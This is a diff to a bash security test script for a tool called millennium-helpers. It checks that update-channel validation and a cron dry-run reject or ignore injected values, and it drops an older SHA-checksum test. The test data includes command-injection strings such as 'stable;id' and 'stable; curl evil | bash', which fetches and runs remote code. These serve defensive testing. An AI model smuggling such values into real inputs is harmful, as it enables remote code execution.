@@ -23,10 +23,6 @@ printf '%s\n' '{}' > "${FAKE_CFG}/millennium-helpers/config.json"
 
 # shellcheck source=../../scripts/common.sh
 source "${REPO_ROOT}/scripts/common.sh"
-# shellcheck source=../../scripts/lib/diag_install.sh
-source "${REPO_ROOT}/scripts/lib/diag_install.sh"
-# shellcheck source=../../scripts/lib/diag_release.sh
-source "${REPO_ROOT}/scripts/lib/diag_release.sh"
 
 # --- Channel allow-list (config poison must not export invalid channel) ---
 printf '%s\n' '{"update_channel":"stable; evil","github_token":""}' > "${FAKE_CFG}/millennium-helpers/config.json"
@@ -44,16 +40,21 @@ out=$(require_update_channel 'stable;id' 2>&1)
 rc=$?
 assert_failure "$rc" "require_update_channel rejects injection payload"
 
-# --- Schedule enable with env-poisoned channel fails closed ---
+# Schedule enable with env-poisoned channel ignores the poison (Go reads config).
 SCHEDULE_SH="${REPO_ROOT}/scripts/millennium-schedule.sh"
 FAKE_HOME=$(mktemp -d)
 export XDG_CONFIG_HOME="${FAKE_HOME}/.config"
 mkdir -p "${XDG_CONFIG_HOME}/millennium-helpers"
 printf '%s\n' '{"update_channel":"stable"}' > "${XDG_CONFIG_HOME}/millennium-helpers/config.json"
+GO_BIN="${REPO_ROOT}/bin/millennium"
+if [[ ! -x "$GO_BIN" ]]; then
+  make -C "$REPO_ROOT" build
+fi
 out=$(CONFIG_UPDATE_CHANNEL='stable; curl evil | bash' bash "$SCHEDULE_SH" enable --dry-run --cron 2>&1)
 rc=$?
-assert_failure "$rc" "schedule enable refuses poisoned CONFIG_UPDATE_CHANNEL env"
-assert_contains "$out" "Invalid update channel" "schedule enable explains invalid channel"
+assert_success "$rc" "schedule enable ignores poisoned CONFIG_UPDATE_CHANNEL env"
+assert_contains "$out" "--channel stable" "cron dry-run embeds validated channel from config"
+assert_not_contains "$out" "curl evil" "cron dry-run does not embed attacker payload from env"
 
 # Valid channel embeds as allow-listed token only
 out=$(bash "$SCHEDULE_SH" enable beta --dry-run --cron 2>&1)
@@ -89,40 +90,11 @@ rc=$?
 assert_success "$rc" "safe_extract_zip accepts normal archive"
 assert_file_exists "${EXTRACT}/ThemeRepo-abc/skin.json" "safe_extract_zip extracts safe member"
 
-# --- diag_release hard-fails missing SHA (non-main) ---
-# Variables consumed inside sourced diag_release.sh helpers.
-export HELPERS_REPO="bolens/millenium-helpers"
-export HELPERS_TRACK="release"
-export LATEST_RELEASE_TAG="v9.9.9"
-export DIAG_RELEASE_WORKDIR=""
-export DIAG_RELEASE_EXTRACT=""
-# shellcheck disable=SC2016 # mock body is intentionally single-quoted; expands when curl mock runs
-mock_cmd "curl" '
-args="$*"
-for a in $args; do
-  case "$a" in
-    *.sha256) exit 22 ;;
-  esac
-done
-out=""
-prev=""
-for a in $args; do
-  if [[ "$prev" == "-o" ]]; then out="$a"; fi
-  prev="$a"
-done
-if [[ -n "$out" ]]; then
-  echo mock > "$out"
-  exit 0
+# --- upgrade --file without checksum fails (Go thin-wrap) ---
+GO_BIN="${REPO_ROOT}/bin/millennium"
+if [[ ! -x "$GO_BIN" ]]; then
+  make -C "$REPO_ROOT" build
 fi
-exit 0
-'
-out=$(diag_fetch_release_tarball 2>&1)
-rc=$?
-assert_failure "$rc" "diag_fetch_release_tarball fails closed without SHA sidecar"
-assert_contains "$out" "SHA256" "diag_fetch_release_tarball mentions SHA256 on failure"
-rm -f "${MOCK_BIN}/curl"
-
-# --- upgrade --file without checksum fails ---
 UPGRADE_SH="${REPO_ROOT}/scripts/millennium-upgrade.sh"
 MOCK_FILE=$(mktemp)
 echo data > "$MOCK_FILE"
